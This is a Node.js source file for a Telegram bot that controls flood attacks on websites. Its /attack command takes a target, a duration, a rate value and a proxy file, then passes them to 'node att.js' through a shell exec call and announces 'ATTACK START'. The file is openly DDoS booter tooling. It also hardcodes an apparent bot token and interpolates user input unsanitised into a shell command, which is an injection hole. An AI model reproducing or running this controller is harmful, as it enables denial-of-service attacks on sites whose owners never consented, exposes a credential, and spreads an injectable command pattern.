const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Telegram bot token
const token = '6311954830:AAFelhOxi5GkzecWwiQIccxvXnfc1rppOQI';
const bot = new TelegramBot(token, { polling: true });

// Maximum and minimum time limits for attack
const MAX_TIME = 240;
const MIN_TIME = 60;

// Countdown time in seconds
const COUNTDOWN_TIME = 30;

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(' ');

  // Ensure correct number of arguments
  if (args.length < 2 || args.length > 4) {
    bot.sendMessage(chatId, `Usage: /attack <target> <time> [<words>] [<proxy_file>]`);
    return;
  }

  // Parse target and time
  const target = args[0];
  let time = parseInt(args[1]);
  
  // Validate time range
  if (isNaN(time) || time < MIN_TIME || time > MAX_TIME) {
    bot.sendMessage(chatId, `Time must be between ${MIN_TIME} and ${MAX_TIME}`);
    return;
  }

  // Set default values for words and proxy_file
  let words = 64;
  let thread = 10;
  let proxyFile = 'proxy.txt';
  
  // Parse optional arguments
  if (args.length >= 3) {
    words = parseInt(args[2]);
    if (isNaN(words)) {
      bot.sendMessage(chatId, 'Words must be a number');
      return;
    }
  }
  if (args.length === 4) {
    proxyFile = args[3];
  }

  // Validate words range
  if (words < 60) {
    bot.sendMessage(chatId, 'Words must be at least 60');
    return;
  }

  // Run the attack command
  const command = `node att.js ${target} ${time} ${words} ${thread} ${proxyFile}`;
  exec(command, (error, stdout, stderr) => {
    if (error) {
      bot.sendMessage(chatId, `Error occurred: ${error.message}`);
      return;
    }
    if (stderr) {
      bot.sendMessage(chatId, `Error log: ${stderr}`);
      return;
    }
    bot.sendMessage(chatId, '😈 ATTACK START 😈');
  });

  // Start countdown timer
  setTimeout(() => {
    bot.sendMessage(chatId, 'YOU CAN NOW ATTACK ANOTHER SITE {BOT OWNER MD OMOR FARUK}');
  }, COUNTDOWN_TIME * 1000);
});

// Handle any command after 30 seconds
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Countdown: 30 seconds');
});
